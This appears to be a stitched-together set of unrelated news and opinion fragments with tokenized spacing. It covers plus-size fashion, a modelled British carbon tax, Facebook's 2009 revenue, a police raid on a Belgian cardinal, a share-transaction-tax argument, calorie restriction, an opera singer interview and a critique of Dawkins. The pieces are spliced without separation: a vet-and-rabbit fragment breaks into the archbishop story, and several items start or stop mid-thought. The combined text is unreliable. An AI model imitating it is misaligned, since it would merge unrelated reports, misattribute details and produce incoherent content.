As Rage writes , “ We are n’t just in a different store , we are the other , the abnormal . ”
Donna ( not her real name ) , who once starved herself into being a “ walking hanger ” in pursuit of a modeling career but now works at Lane Bryant , shares similar sentiments about what ’s really normal :
I put most of the blame on how women feel they have to look [ a certain way ] due to Hollywood and the fashion industry .
Most women in the U.S. are 5 ’ 7 and a size 14 !
So realistically , those toothpick - looking girls … are the freaks .
Another aspect of fat hatred is fat ’s association with a lower - class body , writes Jill at Feministe :
Size , in the United States , is strongly associated with class and attractiveness .
…
Marketing a plus - sized line is still perceived as signaling a down - scale brand .
Designers do n’t want their clothes and their brand associated with larger women because it might challenge their brand ’s cache .
Rage recognizes this dynamic as well , noting how stores such as Lane Bryant are usually located in hidden back corners of malls –in the mall ’s figurative ghetto .
While one cannot a body - barrier break , at least the continuing discussion the controversy has launched takes us a small step towards a future less filled with walking hangers .

THIS newspaper has long advocated a carbon tax as the best way to deal with a warming climate .
This month we asked Cambridge Econometrics , an economic - modelling firm , to assess the impact of a carbon tax on the economy .
To keep things simple and allow for gradual adjustment , we proposed that it should raise revenues equal to 1 % of GDP by 2020 , and that other policies with similar objectives ( fuel duty , subsidies for renewable energy , Britain 's membership of the European emissions - trading scheme — the ETS — and so forth ) would be abolished or cut back .
The results are surprising .
A frequent worry about carbon taxes is that they will hurt business and the economy .
But in our simulation Britain 's economic performance would improve .
Despite raising an extra £ 11 billion in net revenue by 2015 and £ 18 billion by 2020 , our carbon tax ( £ 31 a tonne in 2015 ) would help economic performance , not hamper it .
Output would be 1.2 % higher by 2020 than under the current arrangements .
Philip Summerton , of Cambridge Econometrics , explains that , with a general carbon tax replacing specific , expensive subsidies for renewable energy , more gas - fired power stations would be built .
Since gas power is cheaper than wind power , for example , that would lower the cost of electricity .
That , in turn , would boost production : manufacturing would grow by an extra 2.5 % by 2020 .
Admittedly , not all the news is good .
Britain already depends on gas for around 40 % of its electricity , and it is running out of the stuff .
The tax would do nothing for security and diversity of supply .
Although electricity bills would fall , the price of gas ( the most popular home - heating fuel ) would rise .
Average domestic fuel bills would climb by around 0.5 % between 2010 and 2020 .
And Britain is in fact unlikely to withdraw from the ETS , so the relationship between the ETS price for carbon and the one set by the British taxman ( in our test , higher ) needs some thought .
Confining the revenues from our tax to 1 % of GDP led to greenhouse - gas emissions of 568 m tonnes in 2020 , around 6 % more than they would otherwise have been .
This was a bit of a blow .
But a higher tax rate could drive emissions down , says Mr Summerton , and , in return for slightly more emissions , Britain gains a significantly bigger economy and a useful revenue stream .
This suggests that a carbon tax would be more efficient than the current hotchpotch of policies .
A carbon tax has many more general advantages as a fiscal tool , too .
It would be simpler and more predictable than the current jumble of tax breaks , trading schemes and purchasing obligations .
The principle — that polluters pay for the damage they cause — is easily grasped , and it is politically attractive to tax “ bads ” such as pollution instead of “ goods ” such as work and entrepreneurship .
And , by establishing a reliable price for carbon , it could give businessmen the certainty they need to invest in greener technologies .
But the effect of that is likely to show up only after 2020 .

SAN FRANCISCO ( Reuters ) - Facebook ’s financial performance is stronger than previously believed , as the Internet social network ’s explosive growth in users and advertisers boosted 2009 revenue to as much as $ 800 million , according to two sources familiar with the situation .
The Facebook logo is displayed on a computer screen in Brussels , April 21 , 2010 .
REUTERS / Thierry Roge
The company also earned a solid net profit , in the tens of millions of dollars last year , one of the sources said .
That growth in profit and revenue underscores how Facebook is increasingly making money off its 6 - year - old service , which ranks as the world ’s largest Web social network with nearly half a billion users .
That sort of performance is likely to whet the appetites of investors keen for a public share float , despite the company ’s insistence that an IPO is not a near - term priority .
Palo Alto , California - based Facebook , the booming social networking site dreamed up by Mark Zuckerberg and his buddies in a Harvard dorm room in 2004 , is privately held and has released only very limited nuggets of financial information .
The 2009 results are significantly higher than some of the figures that Facebook had suggested earlier in 2009 , as well as analysts ’ estimates that have appeared in various media reports .
Last July , Facebook board member Marc Andreessen told Reuters the company was on track to surpass $ 500 million in annual revenue for 2009 .
And in September , Facebook said that it had become free cash flow positive , meaning that the company was generating enough cash to cover its operating expenses as well as its capital spending needs .
Estimates in various media reports had previously pegged the company ’s 2009 revenue at $ 550 million to $ 700 million .
The two sources said revenue in 2009 was in fact $ 700 million to $ 800 million .
“ They are downplaying their performance , ” one source said , adding that 2009 revenue was more than double the previous year ’s total .
“ There ’s no upside in getting people ’s expectations high , it ’s always better to go low . ”
If Facebook eventually seeks to go public , unveiling financial figures above expectations could help bolster investor interest .
Facebook declined to comment .
RATCHETING UP
Since its inception , Facebook has emerged as one of the Internet ’s most popular destinations .
The social network is increasingly challenging more established Internet players such as Yahoo Inc and Google Inc for consumers ’ online time and for ad dollars , even as it tries to strike a delicate balance between protecting privacy and promoting social sharing by its users .
In May , Facebook said it would introduce new tools to give users more control to limit how much of their profile information is publicly accessible , following criticism by privacy advocates about certain new Facebook features .
Facebook ’s backers include Digital Sky Technologies , Microsoft Corp , Hong Kong tycoon Li Ka-shing and venture capital firms Accel Partners , Greylock Partners and Meritech Capital Partners .
As investors wait for signs of a Facebook IPO , a vibrant market has developed for private shares of Facebook in specialized exchanges like Sharespost and SecondMarket .
Combining a large audience of Web surfers with innovative online advertising has become a recipe for super - charged revenue growth in the Internet business .
In 2002 , after Google overhauled its AdWords search advertising system and introduced its cost - per - click pricing model , annual revenue quadrupled to $ 347.8 million .
The following year , revenue surged to roughly $ 962 million .
Google finished 2009 with nearly $ 24 billion in annual revenue .
Facebook ’s revenue growth has come as the number of users on its website has exploded .
The company started 2009 with the January announcement that it had reached 150 million users .
By December , that number had swelled to 350 million .
“ We can provide really good , relevant advertising to people because they tell us exactly what they are interested in , and who they know , and those people tell us what they ’re interested in , ” Facebook Chief Executive Zuckerberg said at the All Things Digital conference this month .
He cited statements by other Facebook executives that the number of advertisers on Facebook had increased by a factor of four during the past year - and - a - half .
“ Just having all those different ads in the system makes it so there ’s more to draw from and people get more relevant ads , ” he said .
Big brands such as AT&T Inc , Ford Motor Co and Blackberry - maker Research in Motion all advertised on Facebook during the first four months of 2010 , according to Internet analytics firm comScore .
In addition to courting household names , Facebook also allows smaller companies to craft their own targeted pitches on its site , using a Web - based self - service advertising system .

Police raid home of Belgian archbishop in sex abuse probe
Inquiry : Cardinal Godfried Danneels ' home was raided by police today in connection with a sexual abuse probe
Police investigating child sex abuse allegations yesterday raided the home of the former head of Belgium ’s Roman Catholics .
They seized a personal computer and documents belonging to Cardinal Godfried Danneels .
Around 30 officers and prosecutors took part in raids on his home in Mechelen near Brussels and the archdiocesan palace , headquarters of the church in Belgium .
Yesterday ’s raids come after a wave of paedophilia scandals in the church in Europe , prompting a recent plea for forgiveness from Pope Benedict XVI ‘ from God and the persons involved ’ .
The Pope promised to do everything possible to ensure abuse never occurred again .
Cardinal Danneels , 77 , once considered a contender to succeed Pope John Paul II , retired as archbishop of Mechelen - Brussels in January after 30 years as leader of Belgium ’s eight million Catholics .
Officials would not say whether he was personally under suspicion of involvement in the sexual abuse of children or merely thought to have records relevant to their inquiry .
Cardinal Danneels appears to have been drawn into the inquiry triggered by a confession by Belgium ’s longest - serving bishop , Roger Vangheluwe , to having sexually abused a boy while the cardinal was in office .
Vangheluwe resigned in April .
Spokesman Hans Geybels said the cardinal was giving full cooperation to the authorities , but had not been questioned .
‘ The cardinal believes justice must run its normal course , ’ he added .
‘ He has nothing against that . ’
The Brussels prosecution service said the raids followed recent statements containing allegations that figures within the church had sexually abused children .
The seizure of material was intended to help determine whether the claims were justified , said one official .
Police also searched the office of a committee examining abuse allegations with the help of the Catholic church .
The panel is looking at 500 alleged cases .
Cardinal Danneels was a liberal within the Catholic church and his credentials as a papal candidate were weakened by Belgium ’s record of reforms on abortion , gay rights and euthanasia , and the sharp decline of the church in the country in recent years .
Twelve years ago , he appeared in court as a witness in a case where the church was found to have failed to protect victims of a paedophile priest .
He denied any knowledge of the man ’s actions .
Last month Belgian bishops expressed collective remorse for abuses carried out by priests and for the church ’s silence .
It has been claimed that there have been hundreds of cases dating back almost 20 years .
Cardinal Danneels ’s successor , Archbishop Andre-Mutien Leonard , has pledged a ‘ zero tolerance ’ approach .
However , staff at the vet ’s handed her a rabbit in place of Lexi .
When she pointed out the mistake , she was told Lexi had gone missing .
The veterinary practice manager said the rabbit was handed over by mistake because Miss Brown said she had come to collect two animals and the rabbit was the next one on the operating table after Angel .

Today was a brutal day on Wall Street .
Through no fault of investors .
Today was brutal because of traders and financial engineers who trade on every piece of data .
Those that work from quantitative formulas that drive trades based on data input .
Not a single one of them acts like a shareholder .
And that is the reality of the stock market .
The market is no longer driven by shareholders .
The market is driven by formulas that drive trades .
So what should the government do ?
Tax every single share of stock that is bought and sold 25 cents per transaction .
One quarter .
If you buy a share of stock , your brokerage pays a 25 c tax .
If you sell a share , your brokerage pays a 25 c tax .
1 share , 100 million shares .
Its 25 cents per share .
Of course the tax will be paid for by those of us who are buying and selling stocks .
So what ?
Here is the reality .
If you are a true investor .
Someone who wants to own a share of stock in a company you believe in , then its an amount that is not going to impact your investment decision making process .
You bought those shares to be a shareholder .
If you dont think the company you are buying is worth at least a quarter more than what you are paying , why are you buying shares ?
If you are a professional trader or an institutional trader that trades continuously , the same type of traders that created the mess in the market today , then it may impact your decision making process , but only to the point of reducing your returns by a minimal amount .
Its not going to change your inclination to trade .
As everyone on Wall Street will tell you “ Traders Trade ” .
You may trade less and make less in aggregate , but no one but you cares about that .
You will find your way to make money .
There is always the loop hole and inefficiency .
Thats what you live for .
But you wo n’t stop trading .
If you are a day trader , you are going to have to be right more often or actually hold on to stocks for a longer period of time .
That ’s ok .
I know it will be rough on some of you that make a living this way .
But in reality , you do n’t add anything to the markets .
Whats the bigger economic impact of having the tax ?
If the NYSE , Nasdaq , Amex and OTC are trading 2 Billion shares a day or more , like today , thats $ 500 Million Dollars PER DAY .
If there are 260 trading days a year .
Thats about 130 Billion dollars a year .
If volumes drop because of the tax .
It is still 10s of Billions of dollars per year .
Thats real money for the US Treasury .
Thats also an annual payment towards the next time Wall Street screws up and we have a black swan event that no one planned on .
Of course there has to be some fine print .
You could reduce the tax per share for stocks under $ 5 dollars to 5cents .
But i would leave it at 5cents even for stocks priced at pennies per share or less .
This tax would act as a protection for investors and traders who get pitched unregulated penny stocks and who are more often than not the victims of rip off artists .
It would minimize the pink sheet companies that trade billions of shares of stocks priced for pennies .
Those companies that are legit , could do a reverse split to protect their investors .
The others can go away .
They probably should n’t be public anyway .
The stock market today is dominated by financial engineers and traders .
Institutions who look for the loopholes and exploit them .
Thats not a bad thing .
There will always be loopholes , and they will always find them .
But at least with the tax , when they do , we are protecting ourselves a little bit .
Heck , the Treasury could join in the show and buy long and short 20 pct out of the money derivatives on the market to protect us even more .
This way if things go haywire like they did a couple years ago and have the past few days , the Treasury will be playing with Wall Streets ’ money .
I ’m sure Main Street wo n’t mind terribly if the Treasury plays with the house ’s money .
Particularly since the only given for Wall Street is that every 5 years or so there will be an extreme event .
Why ?
Remember the rule of Wall Street …
First there are the innovators .
Then there are the imitators .
Then there are the idiots .
And there are tons and tons of idiots .
Just look at the billions upon billions squandered in closed Hedge Funds .
The idiots always find there way back into the market and the market always wipes them out taking investors down with them .
It ’s time to make all those playing this game pay a tax per transaction .
And one more thing .
When Wall Street talks about how a tax will hurt liquidity , ask them why , if liquidity is so essential to a market , they do n’t want any transparency and are n’t trying to increase liquidity for the derivatives they sell on a custom basis ?
Or why they are not trying to increase the liquidity for the corporate bond markets where bonds trade with a huge spread ?
They want minimal transparencies where the spreads are high and they can keep them that way and price their products anyway they like .
Where the spreads are already low , they cry wolf about the liquidity they need to do business .
Let me explain the reality of liquidity in today ’s world .
It wo n’t increase the amount of capital available to businesses .
The companies that plant servers next to stock exchanges to make a few cents per trade are n’t buying IPOs , secondary offerings , or holding shares in support of valuations in a company they believe in .
Every time markets crater , there is never a lack of liquidity .
THere are still a billion or more shares traded .
There is plenty of liquidity .
So tax the hell out of Wall Street , give it to main street .
Make it tougher for the financial engineers and you will make it easier for investors to evaluate companies and hold on to shares and maybe even act like owners of those companies .
Taxing the Hell Out of Wall Street could actually increase the trust investors have in Wall Street .
And it might just protect us when the next meltdown happens .
And it will happen
The idiots will see to it .

IN GREEK mythology , the tale of the Trojan prince Tithonus is a tragic one .
His lover , the goddess Eos , asks Zeus to grant him eternal life , but forgets to specify eternal youth .
Time passes , and while the goddess of dawn stays young and beautiful , Tithonus degenerates into bedridden senility .
Eventually Eos shuts him in a chamber of her celestial palace , where his feeble voice can be heard begging for death .
Dreams of eternal youth feature in many cultures throughout history , but it was only in the 20th century that research into longevity really began .
Much about ageing is still mysterious – we do n’t even know the underlying reasons why we journey into old age .
There are many lines of enquiry into how to live longer , though , with one of the most intriguing being calorie restriction : in effect , going on a lifelong diet .
Calorie restriction dramatically extends not only the lifespan of laboratory animals , but also their “ healthspan ” – how long they live free of disease .
On the assumption that it has the same effect in people , some individuals have already adopted a restricted diet .
The latest evidence suggests that while calorie restriction is indeed beneficial for humans , when it comes to lifespan extension , it may not be the whole story .
The good news is that we might be able to delay ageing without cutting our food intake .
“ There ’s a definite possibility that if you balance the diet correctly , a longer lifespan can be achieved without full food restriction , ” says Matthew Piper , a researcher into ageing at University College London .
 There is a definite possibility that if you balance …

WASHINGTON -- Forty - eight states and the District of Columbia have submitted a brief to the Supreme Court in support of a father who sued anti-gay protesters over their demonstration at the 2006 funeral of his son , a Marine killed in Iraq .
Only Virginia and Maine declined to sign the brief by the Kansas attorney general .
Albert Snyder sued over protests by the Kansas - based Westboro Baptist Church at his son's funeral in Maryland .
The church , founded by Fred Phelps in 1955 , pickets funerals because they believe war deaths are punishment for U.S. tolerance of homosexuality .
The Supreme Court has agreed to consider whether the protesters ' message is protected by the First Amendment .
In the brief filed Tuesday , the states argued they have a compelling interest in protecting the sanctity of funerals .
A mother was convicted of a misdemeanor harassment charge Thursday for posting messages on her teenage son ’s Facebook page and leaving him a series of voice - mail messages , including one calling him a “ piece of s***. ”
Denise New , 35 , will have to take parenting and anger management classes , pay fines and stay away from her son or face a month in jail .

The study , which has created excitement in the academic world , also suggests he anticipated the scientific revolution of Galileo and Sir Issac Newton by about 2,000 years after “ discovering its most important idea ( that ) the book of nature is written in the language of mathematics ” .
House Democrats pushed for it , but on Tuesday opponents of a bill that would extend unemployment benefits for Americans long out of work won this round of legislative jostling over how to help struggling job hunters without plunging the country too much further into debt .
–KA
AP via Google News :
Democrats brought up the bill under a special procedure in which no amendments were allowed and debate was limited .
Under the procedure , the bill needed a two - thirds majority to pass .
The vote was 261 - 155 , short of the two - thirds needed .
House Democrats now plan to bring up the bill again under regular business , in which the bill would need only a simple majority to pass , said Rep. Sander Levin , D - Mich. , chairman of the House Ways and Means Committee .
Levin said he expects the House to vote on the bill again Wednesday .
In Tuesday ’s vote , nearly all Democrats voted in favor of the bill , while most Republicans opposed it .

Saturday , just as Full Figured Fashion
Week was in full swing , a story about the highly lucrative plus - size market hit the front page of The New York Times .
That night , I went to the FFFW finale runway show .

The show was completely different from a runway presentation you might see during Meredes - Benz fashion week , and not just due to the size of the models or folks in the audience .
People were smiling .
Sometimes , at mainstream fashion shows , the air is full of stress , haughtiness and self - importance ; the self - aggrandizement is overwhelming .
At the FFFW finale , it was impossible not to be struck by the friendly , welcoming atmosphere .
The show was held in the ballroom of the Park Central Hotel , and although it was warm , and a fuse blew , and things started late , the audience and the organizers were s in good spirits , and people seemed genuinely excited to be there .

( this dress — and the at top — by Igigi )
We saw thirteen collections — a huge undertaking for FFFW creator Gwen DeVoe and her team .
Some of the names were familiar : Igigi by Yuliya Raquel ; Project Runway 's Qristyl Frazier ; Monif C..
Other lines were new to me : Pheline by Ava Jones ; Bella Rene by Kenyatta Jones ; LaMaica by Marvalyn Nelson ; KRene Designs by Kathy Youg ; Lotis Clothing by Katie Burke and Renée Lethbridge ; Tru Diva by Veronica Lipscomb ; Osun Designs by Delali Haligah ; Jewel Shannon Design , and a tribute to the late Charles Coleman of Bella Donna designs .

While the shows offered everything from red - hot swimsuits to gently flowing gowns and simple basics , the crowed seemed the most enthusiastic when there was drama , extravagance and sheer fierceness on the runway .
Glittery tops perfect for a night on the town and huge , elaborate stand - up collars elicited applause .
The models — all of them plus - sized — were a variety of shapes , sizes and ethnicities — one of the most diverse runways I 've ever seen .

The only downside , if any , were some of the food - oriented or skinny - bashing comments participants made .
The show kicked off with a poet talking about " waif not , want not " and cornbread or some such — when we all know that different people have different metabolisms and there are plenty of overweight people who eat healthy foods — just as there are plenty of slender people who eat fatty junk foods .
( The poet did have some great lines , however , like " There was beauty in your body way before you started doing Pilates " and " A woman should never let her love handles dictate how she handles love . " )
In addition , there were references to plus - size women being " real , " when perhaps " realistic " would be a more fitting term .

But truly :
While there were amazing clothes , it was the emotion that made the show special .
In backstage interviews projected to screens , the designers gushed about creating clothes for women with confidence and sense of self - acceptance ; women who like standing out in a crowd and setting trends instead of following them ; and the " sisterhood " of the plus - size industry .
Unlike Mercedes - Benz Fashion
Week , there were a only a few " famous " faces in attendance — America 's Next Top Model alum Whitney Thompson ; Tali from More To Love ; Kristian from More To Love — but the joy in the room was definitely a nice chance of pace from the often snotty , jaded hipper - than - thou attitude fashion shows usually entail .

American soprano Danielle De Niese 's trajectory to stardom is the stuff of any singer 's dreams .
Blessed with exotic good looks - the result of mixed Sri Lankan and Dutch heritage – and a natural ability as actor and dancer to complement her voice , she is little short of a one - woman Gesamtkunstwerk .
A Met debut whilst still in her teens saw her share the stage as Barbarina in Mozart 's The Marriage of Figaro with Bryn Terfel , Cecilia Bartoli and Renée Fleming , conducted by James Levine and directed by Jonathan Miller .
This was followed by further performances at the Met and Europe before her breakthrough appearance for audiences in the UK , Glyndebourne 's 2005 staging of Handel 's Giulio Cesare .
Her all - singing , all - dancing Cleopatra helped make David McVicar 's outrageously entertaining production one of the festival 's biggest hits of recent years .
With the first album of a contract with Decca under her belt , and a second – of Mozart – due out this year , she returns to Glyndebourne for a revival of Handel 's masterpiece this summer , not just as a star attraction , but also as the newly - engaged fiancée of Gus Christie , the festival 's executive chairman .
It 's an impressive CV for a singer still in her twenties and she adds to it this month with her Royal Opera debut , singing Galatea in the second part of a double bill of Purcell 's Dido and Aeneas and Handel 's Acis and Galatea , directed by the Royal Ballet 's in - house choreographer , Wayne McGregor .
The production marks a rare collaboration between the Royal Ballet and the Royal Opera , in which , I suggest , the famously versatile De Niese must be in her element .
' For me movement is a part of an interpretation .
Because I 've had some dance training , I am not particularly frightened of the thought of it ; but it always has to be in the right context to really work , it can't just be done for the sake of it .
So in this particular production Wayne has a whole team of dancers that are representing us as characters .
I will do a bit of dancing in it , but it will be just at the very end .
' Galatea is always in movement , she 's always in motion , and there 's an element of body language that 's crucial to her being .
She 's this person who 's in between being mortal and immortal , she has both qualities .
She 's very at one with nature and at the same time she has this feeling that she 's not of this world , that she 's not of earthly things yet she 's earthly .
So that 's really fun to play , because there 's something spiritual about her , she 's very organic and rooted . '
De Niese is obviously enjoying working with McGregor , whom she describes as ' a wonderful human being ' .
She goes on to explain that 'he 's a bit like nature , he 's very calm and easy - going and exciting all at the same time .
He 's a great worker , he 's patient , he 's very peaceful and he 's very human . '
De Niese 's enthusiasm is infectious and she illustrates her points with elaborate and elegant hand gestures .
It comes as no surprise that , similarly to the famous Glyndebourne Giulio Cesare , she enjoys being part of the process of building a production .
' Some directors will have mapped out the whole show , others will take everything out of what they have in the space , who they have working for them and what comes to them in the moment .
Here we have a bit of both .
For example , Wayne will come back the day after a rehearsal with some new ideas and , having let a scene sit and simmer for a while , puts them on the table ; we sit and develop them , let them grow , evolve and change .
It 's a process that allows things to fly a bit ; we see what happens , and then harness it and fine tune it . '
She hopes that this atmosphere of creativity will spill into the actual performances .
' Even in choreography , which is designed by definition , one can still breathe and move within the structure .
Handel 's like that too , it 's freedom within this form .
You have form in Baroque music that 's more structured than your Romantic music : aria , aria , aria ; recitative , recitative , recitative ; da capo , da capo , da capo .
Yet within that you have all this freedom to stop , to pause , to breathe , to think , to recreate ornaments to reinvent them .
It 's nice , it 's good for the piece .
And I think it really lends itself to that sort of creative combination of movement , thought , song and text . '
Has she managed to catch a glimpse of the Dido and Aeneas which forms the first half of the double bill ?
' I have n't seen a single thing of Dido , we 've been rehearsing at different times so I 'm sure it must be quite crazy for the production team !
My dear , dear friend Sarah Connolly is singing Dido so I can't wait to see it . '
Connolly and De Niese are reunited , too , for the Glyndebourne Giulio Cesare revival .
' We 're going to be shuttling back and forth , ' she explains , ' performing Dido and Galatea here and then rehearsing Giulio Cesare and Cleopatra at Glyndebourne . '
Giulio Cesare is being revived by David McVicar himself , along with the original production 's choreographer , Andrew George .
With such a creative team , it would seem unlikely that audiences will be treated to a straightforward re-run of the 2005 show , now immortalised on DVD .
' They have a structure , ' De Niese tells me , ' but they do n't make it like an old template .
They really re-work things and breathe life into it as if it was a new piece , and I love that about them .
I remember doing it for the third time in Chicago and it was like a different production .
David really stressed to the returning members : " Do n't go on auto - pilot and do n't do what you did last time .
We do n't want to think about that , we want to think about now and what this piece means now ! "
They 're also really dear friends , ' she smiles .
' I love it when I get on with directors .
Once you form that bond , then it goes deeper than being merely professional .'
As well as Cleopatra , De Niese has sung the title role in Monteverdi's Coronation of Poppea in the UK , at last year 's Glyndeborne Festival .
Galatea , I suggest , is a very different creature from those two .
' My job is to play different characters .
A lot of people who have seen me as Cleopatra and Poppea – which are the two main things I 've done here in the UK – they assume that is either ( a ) my personality , or ( b ) that that 's all I can do .
They then ask how I will face the challenges of playing another role .
But , I 've played Rodelinda , I 've played Semele , I 've done L'enfant et les sortilèges where I played a boy , so I like the idea of pushing myself and the idea of not being boxed in .
This is especially the case dramatically , because the story and the nitty - gritty is like your meat to chomp on when you work on a piece .
For me it 's always really important to make sure I have a nice , complex , interesting character and that I work different muscles .
' It was great because when I did Rodelinda – and I wish I could do it again – I loved the challenge of playing a young mother .
It was so different from my other characters .
I can even remember my manager coming to me and saying " I did n't know whether I could believe you as a young mother . "
But it worked ; it was amazing .
He was so impressed , and that was a huge thing for me : to go into the skin of someone that I could n't relate to – because I do n't have children – and channel different maternal instincts through my mother , through my relationship with her .
For me that 's a huge element of this job , or rather this career , this art .
You have to cultivate yourself and you have to challenge yourself .
So for me , yes , Galatea is like a different arrow that I 'm pulling out ' – she gestures to an imaginary quiver behind her back – ' I think that 's good . '
She is thrilled , it seems , by the transformation that her costumes will effect in her , too .
' I 'm wearing a blonde wig as Galatea – a really , really big blonde wig .
I 'll look so starkly different .
I 'm wearing flats , too .
I 'm very much a person of earth , of nature .
She 's a wild spirit and she has a femininity to her , a grace that 's young , that 's innocent , beautiful and pure , and real ; it 's very real - this wig is crazy !
It 's all piled up like this , ' she enthuses as fluid , dancerly gestures create an imaginary coiffure in the space above her head .
Putting her character in context , she continues : ' There 's quite a modern edge to this piece .
We 're not going for friendly woods and rustic nymphs and everybody frolicking , we 're going for a very realistic , modern yet timeless and slightly edgy look to the production .
I think it 's going to be great !'
The conversation moves on to De Niese 's burgeoning career as a recording artist .
Her first disc for Decca , Handel Arias , was released in 2008 , going on to top the iTunes classical chart and cementing her already formidable reputation as an exponent of that composer 's works .
Her second disc , due out on Decca later this year , returns to her first love : Mozart .
' Mozart to me is the second step in my recording career , but the first step in my musical life .
So this is like coming back to the beginning for me .
I made my debut in Amsterdam with Cleopatra in 2001 and that 's what started the Baroque train .
This Early music has been wonderful thing for me to sing : it 's healthy for the voice and I 've learnt so much ; I will always want to sing those roles .
So with coming back to Mozart , it 's like the ying and yang .
It 's not like I 'm graduating to Mozart , I 'm just changing to the other side of what my voice does .
' The Mozart album , just like the Handel , has been painstakingly difficult to programme , because there were so many wonderful things I wanted to do and just not enough sides to incorporate everything .
I 'm really proud of the programme , though , and it's an interesting selection .
I did n't really realise , but a lot have people have told me that it's not your average , run -of - the - mill Mozart programme , that there are really not so many " famous " pieces on it .
For example , I picked one aria called " O temerario Arbace " : it 's a concert aria , K.79 , and he wrote it when he was ten !
It knocks your socks off .
It 's so mature .
' I tend to have connections too with the things I do on these discs , so I 'm including the alternate Susanna aria " Al desio di chi t'adora " , which is what I sang in all my auditions for the Met 's Young Artists programme .
I 'm singing Despina , I 'm singing Ilia 's entire opening scene [ from Idomeneo ] : I knew that if I ever did a Mozart disc I would have to include that .
And I love Ilia , I can't wait to perform it .
There 's Lucio Silla , " Laudate Dominum " from the Vesprae solennes and another huge concert aria , " Bella mia fiamma " [ K.528 ] . '
The disc also reunites De Niese with Bryn Terfel , who was singing Figaro when she made her Met debut as Barbarina a decade ago .
' I feel so honoured , ' she exclaims .
' He asked me once to do a tour of Canada with him and I can remember being absolutely distraught when the Met would n't let me go because I was still on the Young Artists programme .
So now , finally , back we are to do this duet which was such fun . '
Providing accompaniment is the Orchestra of the Age of Enlightenment under conductor Sir Charles Mackerras , whose name she intones quietly with a mixture of awe and affection .
' He is , to me , one of the guiding lights in terms of Mozart over the years .
He 's really defined Mozart in a very special , authoritative way .
Whereas in the Handel I did a lot of my own ornaments , for this Mozart I left myself in Sir Charles ' hands completely , in terms of the proportion of ornamentation one should include .
So the ornaments are very minimal but very beautiful .
I think it 's exactly right for the music and for the personality and the tone that I wanted to achieve with each aria .
So that was a real thrill .
I love him !'
As her enthusiasm brims over again , she worries : ' You 're going to walk out of here thinking " My God , she just loves everybody ! " '
Despite her success , however , she emphasises how lucky she is to work with fellow artists who share and nurture her passion .
As such , the recording of her Mozart album sounds like a highlight of her career to date .
' It was a really big moment for me , because my voice is growing right now and when I was doing that disc I was also going through a huge growth - spurt .
Apart from anything else , it 's a very emotional experience to go and sing all that Mozart .
I was in seventh heaven , I was so happy .
I came out of the recording feeling like I 'd climbed Mount Everest , I just felt very good about it .
Everyone was just so enthusiastic and the orchestra was so happy , and it was a great experience .
No -one was on autopilot , we went in and had a great time and everyone put genuine effort into the making of it . '
Although never absent from her repertoire , Mozart is beginning to feature more and more in her schedule .
' I 'm singing Susanna at the Met this coming season , 2009 - 10 , and then again at the Chicago Lyric , Despina at the Met again in a couple of years time .
I love , I mean really lurve , Mozart , ' she drawls , investing the word the with almost inappropriate passion .
' It 's what life is about .
I do n't think I have any Mozart scheduled here .
I 'm doing other things , though . '
I press for more but she she studiously avoids specifics : ' Well , quite a few things … my next step vocally is adding Donizetti into this mix of Mozart and Handel .
But carefully .
So I 'm adding things like Adina in L'elisir d'amore and Norina in Don Pasquale . '
It 's clear that De Niese is planning her repertory carefully .
I ask , however , if there are any roles she has a particular desire to sing in the future .
' Every time someone asks me , a voice in my head tells me " Do n't say it ! "
But I can't help but want to respond honestly and the role I know I want to do and let it envelope me is Massenet 's Manon .
I love that role .
I sang Poussette at the Met , and that 's when the bug bit me .
She 's so complex , and it must be very difficult to manage all the facets of her character well .
It 's not just a vocal challenge , then , but a dramatic challenge , too , and I 'd have to see if I can do both .
I 've had offers to do it , because people have read about it in the press .
I 've said no , because I want to know I 'm ready and then schedule it , rather than project that I 'll be ready in five years . '
She laughs when she recounts that she was offered Aida at the beginning of her twenties , ' because I looked the part ' .
But does she see herself venturing further into the bigger Italian repertoire ?
' Well , I 've done Nanetta in Falstaff , which is a beautiful thing and the lyricism of Verdi really suits me .
I 've also done Lauretta in Gianni Schicchi , so I feel like I understand the style .
At some point I will look at the other roles , but for now I would n't sing more than Musetta [ in La bohème ] and Lauretta or Nanetta .
At some point , maybe in ten years , maybe sooner ; it depends on how the voice grows .
' People in the business who know me , they know better than to make unrealistic offers regarding repertoire , because they know I do n't want to be a flash in the pan , they know how in love I 've been with singing since I was I child .
I started so young because I wanted to and because I loved it .
They know that , and they know that I have a good team of people around me , keeping an eye out for me and making sure that crazy operas do n't even land on my desk .
So most of the houses I work for wo n't put Aida in front of me these days , because they also want to support me and do what 's right for my voice .
Still , you can't imagine how many people say " Oh , you should do Carmen " .
I 'd love to do Carmen one day but , the problem is I 'm not a mezzo !'
De Niese 's optimism extends to a positive view of the world of classical music and its prospects during the recession .
' Classical music is still doing really well ; people want to go and see it .
These opera broadcasts at the movies are doing really well and getting opera out to more people , so it 's a matter of getting young dynamic people out there . '
Does she see herself as a shot in the arm for the classical musical world , as she 's often portrayed , and an ambassador for the youth of the world ?
' I see myself as a natural flag - bearer for classical music to the youth because I have done out - reach since I was twelve years old .
I started so young so I feel an obligation to do it .
It 's not a chore , though , it 's something that comes so naturally to me .
That 's why I started at a young age , because I knew going out there and singing for my peers would really change their impressions of what it 's like to be a classical singer .
And once the stereotype is broken or the misconceived ideas are changed then one can be really open .
' It 's not about preaching to people to get them to convert to classical music .
I think it 's really important to respect all kinds of music and I have profound respect and appreciation for a lot of other types of music that are not classical .
When I set out to talk to kids , I do n't tell them they have to love classical music and they 've got to love what I do .
It 's just about opening their minds to the possibility that there are things in classical music that they can relate to , that they can appreciate .
You do n't need a degree to love classical music , it 's not something that one must have a sophisticated musical taste to appreciate .
Granted , having a sophisticated musical experience can give you deeper levels of understanding about the music , but the most important thing to understand is how it moves you .
You need nothing for that except your own heart , your own ears and eyes , and your body and mind to be open to it . '

Much of Dawkins 's research has been in silico , writing programs for evolutionary simulations .
In his simulations , life is utterly determined by genes , which specify developmental rules and fixed traits such as colour .
The more lifelike his digital animals ( " biomorphs " ) become , the more persuaded he is that real genes work in roughly the same way .
Dawkins 's critics accuse him of genetic determinism .
This synopsis of his work shows that his life virtually depends on it .
A curious stasis underlies Dawkins 's thought .
His biomorphs are grounded in 1970s assumptions .
Back then , with rare exceptions , each gene specified a protein and each protein was specified by a gene .
The genome was a linear text -- a parts list or computer program for making an organism -- insulated from the environment , with the coding regions interspersed with " junk " .
Today 's genome is much more than a script : it is a dynamic , three - dimensional structure , highly responsive to its environment and almost fractally modular .
Genes may be fragmentary , with far - flung chunks of DNA sequence mixed and matched in bewildering combinatorial arrays .
A universe of regulatory and modulatory elements hides in the erstwhile junk .
